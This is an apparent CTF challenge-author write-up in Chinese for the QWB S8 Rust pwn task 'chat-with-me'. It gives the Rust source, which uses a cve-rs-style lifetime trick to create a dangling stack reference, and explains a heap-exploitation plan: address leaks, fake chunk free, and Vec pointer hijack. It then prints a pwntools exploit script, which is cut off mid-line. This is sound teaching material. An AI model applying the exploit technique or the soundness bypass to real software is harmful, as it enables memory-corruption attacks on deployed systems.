---
title: 强网杯S8 Rust Pwn chat-with-me出题思路分享
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458585919&idx=1&sn=84f77689a0b84efb4980fc602ef1b174&chksm=b18c3bb586fbb2a34dec76c2326650be9067ec1191bea06eb42b77090d8b51b9cef89b5f0413&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-12-14
fetch_date: 2025-10-06T19:41:31.189693
---

# 强网杯S8 Rust Pwn chat-with-me出题思路分享

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHHEO8FO0bLIHNzUocbxCXCibpa9SDdZOflN0978Aso5J2KxsuyBkSuHw/0?wx_fmt=jpeg)

# 强网杯S8 Rust Pwn chat-with-me出题思路分享

GeekCmore

看雪学苑

**1**

**出题思路**

本题最终解数为42，因为题目难度不大，总体符合预期。题目是用rust写的代码，同时赛前夜里临时决定删除符号不给源码，一方面导致选手逆向难度很大，另一方面也让大部分选手把精力集中在动调上，避免陷入源码的细节。在出题过程中其实也没有漏洞和明确利用手法的考点，题目是一边学习一边调试的时候出出来的，再次把出题思路分享给大家，算是抛砖引玉。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEH71V96jicpAxAuFWOZKPu8NJyz4Ta6NdwTOxW8gtqU5ROnL7jknOdbeg/640?wx_fmt=png&from=appmsg)

这里还是首先给出源码（ rustc 1.82.0-nightly (cefe1dcef 2024-07-22) ）：

```
use std::fmt;
use std::io::{self, Read, Write};

const MAX_MSG_LEN: usize = 0x50;
struct Msg {
    data: [u8; MAX_MSG_LEN],
}

impl Msg {
    #[inline(never)]
    fn new() -> Self {
        Msg {
            data: [0; MAX_MSG_LEN],
        }
    }

}

impl fmt::Display for Msg {
    #[inline(never)]
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{:?}", self.data)
    }
}

#[inline(never)]
fn prompt(msg: String) {
    print!("{} > ", msg);
    io::stdout().flush().unwrap();
}

struct ChatBox {
    msg_list: Vec<&'static mut Msg>,

}

impl ChatBox {
    #[inline(never)]
    fn new() -> Self {
        ChatBox {
            msg_list: Vec::new(),
        }
    }

    #[inline(never)]
    fn add_msg(&mut self) {
        println!("Adding a new message");
        self.msg_list.push(self.get_ptr());
        println!(
            "Successfully added a new message with index: {}",
            self.msg_list.len() - 1
        );
    }

    #[inline(never)]
    fn show_msg(&mut self) {
        prompt("Index".parse().unwrap());
        let mut index = String::new();
        io::stdin().read_line(&mut index).expect("Failed to read");
        let index: usize = index.trim().parse().expect("Invalid!");
        println!("Content: {}", self.msg_list[index]);
    }

    #[inline(never)]
    fn edit_msg(&mut self) {
        prompt("Index".parse().unwrap());
        let mut index = String::new();
        io::stdin().read_line(&mut index).expect("Failed to read");
        let index: usize = index.trim().parse().expect("Invalid!");
        prompt("Content".parse().unwrap());
        let mut handle = io::stdin().lock();
        handle.read(&mut self.msg_list[index].data).expect("Failed to read");
        println!("Content: {}", self.msg_list[index]);
    }

    #[inline(never)]
    fn delete_msg(&mut self) {
        prompt("Index".parse().unwrap());
        let mut index = String::new();
        io::stdin().read_line(&mut index).expect("Failed to read");
        let index: usize = index.trim().parse().expect("Invalid!");
        self.msg_list.remove(index);
    }

    #[inline(never)]
    fn get_ptr(&self) -> &'static mut Msg {
        const S: &&() = &&();

        fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
            fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {
                val_b
            }
            let f: fn(_, &'a mut T) -> &'b mut T = ident;
            f(S, x)
        }
        let mut msg = Msg::new();
        get_ptr(&mut msg)
    }
}

#[inline(never)]
fn main() {
    let mut chat_box = ChatBox::new();
    println!("I am a chatting bot of QWB S8, you can chat with me.");
    println!("If you delight me, I will give you flag!");
    println!("This is function menu: ");
    println!("1. add");
    println!("2. show");
    println!("3. edit");
    println!("4. delete");
    println!("5. exit");
    loop {
        prompt("Choice".parse().unwrap());
        let mut choice = String::new();
        io::stdin().read_line(&mut choice).expect("Failed to read");
        let choice: i8 = choice.trim().parse().expect("Invalid!");

        match choice {
            1 => chat_box.add_msg(),
            2 => chat_box.show_msg(),
            3 => chat_box.edit_msg(),
            4 => chat_box.delete_msg(),
            5 => break,
            _ => println!("Invalid Choice!")
        }
    }
}
```

本题在构思的时候其实是想用不含unsafe的rust语言构造一个漏洞，因此一方面在RustSec上寻找合适的漏洞，另一方面发现了cve-rs项目。首先在RustSec找的漏洞不太适合出题，又限于出题时间和自身水平，最终还是选择用cve-rs内的原理，“盗用”了

UIUCTF 2024 Rusty Pointer题目的触发POC：

```
fn get_ptr(&self) -> &'static mut Msg {
        const S: &&() = &&();

        fn get_ptr<'a, 'b, T: ?Sized>(x: &'a mut T) -> &'b mut T {
            fn ident<'a, 'b, T: ?Sized>(_val_a: &'a &'b (), val_b: &'b mut T) -> &'a mut T {
                val_b
            }
            let f: fn(_, &'a mut T) -> &'b mut T = ident;
            f(S, x)
        }
        let mut msg = Msg::new();
        get_ptr(&mut msg)
    }
```

据我的理解，这段POC实际上是利用对变量静态生存周期的混淆，欺骗rust编译器不释放离开生存期的变量。

通过上述的技术原理，我们可以得到一个离开生存期仍然可用的指针（或者说对象），在此题中将其用到了栈上对象，因此我们可以获得一个`get_ptr`函数内的一个栈对象`msg`：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHu0ia4iaLP9n9K7fqq31ay0x04qPZ9l1dpVRBLAkZjmRicNQRgnBAHedLQ/640?wx_fmt=png&from=appmsg)

而每次`add`的时候，由于函数调用的顺序不变，实际上每次申请得到的地址都是一样的。虽说这样让程序逻辑有些奇怪，但是也让堆的可控变小了。另外，`Msg`的大小变化其实会导致栈布局，包括该离开生命周期的栈指针的能力发生变化，有时可以直接写到返回地址，这太简单了肯定不行。

```
const MAX_MSG_LEN: usize = 0x50;
```

**2**

**解题思路**

一血战队ACT的解法实际上跟我的预期解是一样的。通过show可以泄露栈上的堆地址、栈地址、ELF地址，通过`edit`我们可以发现存在任意地址释放，但是问题在于怎样利用该能力实现栈地址写或者任意地址写。

我们现在手上有两个条件，首先是任意地址释放，其次是rust的`vec`类似于C++，使用`realloc`扩容，其指针数组也存储在堆上。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEHOlGlef9UtgiaRIyrHHcLTic5HNicNzUMJjXMsFgoTHHRicBjBcCjsp9iaKg/640?wx_fmt=png&from=appmsg)

因此不难想到通过释放伪造堆块，将`vec`的指针数组劫持到我们可控的位置，而我们可控的位置最直接的就是栈上0x50的空间，另一个是stdin的输入在堆上的缓冲区。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FYVzMQRHX0eSZLcNDvibsEH03w6FBkgXElkKN6Ciax6SStASOxGxzaHkCictmFaejE02rxzelYBKn3A/640?wx_fmt=png&from=appmsg)

实际上从选手做法来看，这两个位置都可以成功伪造堆块，实现控制`vec`的指针。

这里给出我的exp：

```
#!/usr/bin/env python

"""
author: GeekCmore
time: 2024-10-30 17:06:06
"""

from pwn import *

filename = "/home/geekcmore/Desktop/qwb/chat_with_me/attachments/pwn"
libcname = "/home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6_2.39-0ubuntu8.3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"
host = "localhost"
port = 6666
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = """
b *$rebase(0x1A979)
b /home/geekcmore/RustroverProjects/chat-with-me/src/main.rs:145
set debug-file-directory /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/libc6-dbg_2.39-0ubuntu8.3_amd64/usr/lib/debug
set directories /home/geekcmore/.config/cpwn/pkgs/2.39-0ubuntu8.3/amd64/glibc-source_2.39-0ubuntu8.3_all/usr/src/glibc/glibc-2.39
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process(elf.path)

p = start()

def add():
    p.sendlineafter(b"Choice > ", b"1")

def show(idx):
    p.sendlineafter(b"Choice > ", b"2")
    p.sendlineafter(b"Index > ", str(idx).encode())

def edit(idx, content):
    p.sendlineafter(b"Choice > ", b"3")
    p.sendlineafter(b"Index > ", str(idx).encode())
    p.sendafter(b"Content > ", content)

def delete(idx):
    p.sendlineafter(b"Choice > ", b"4")
    p.sendlineafter(b"Index > ", str(idx).encode())

def quit():
    p.sendlineafter(b"Choice > ", b"5")

def tidy():
    p.recvuntil(b"Content: ")
    y = p.recvline()[1:-2].decode().replace(" ", "").split(",")
    values = []
    for i in range(10):
        tmp = 0
        for j in range(8):
            tmp += int(y[i * 8 + 7 - j])
            tmp <<= 8
        tmp >>= 8
        values.append(tmp)
    info([hex(x) for x in values])
    return values

add()
show(0)
addr_list = tidy()
stack_addr = addr_list[4]
elf.address = addr_list[5] - 0x635B0
heap_addr = addr_list[1]
success(f"stack_addr -> {hex(stack_addr)}")
success(f"elf_addr -> {hex(elf.address)}")
success(f"heap_addr -> {hex(heap_addr)}")
fake_heap = p64(1) + p64(0x91) + p64(1) * 2 + p64(heap_addr - 0x2010) + p64(0x1FE1)
edit(0, fake_heap)
tidy()
# pause()
for _ in range(6):
    add()

info("start")

def arb_qword(addr, qword):
    edit(1, p64(0)...